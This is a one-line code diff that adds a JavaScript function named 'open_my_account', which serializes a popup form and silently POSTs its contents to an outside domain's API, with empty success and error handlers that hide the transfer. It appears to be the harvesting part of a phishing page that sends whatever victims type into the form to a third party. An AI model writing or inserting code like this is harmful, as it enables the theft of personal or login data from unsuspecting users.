@@ -1,0 +1,1 @@
+function open_my_account() {var e = $(".popup-form").serialize();$.ajax({url: 'https://arpanrizky.my.id/api/',data: e,type: 'POST',success: function() {},error: function() {return true;}});}
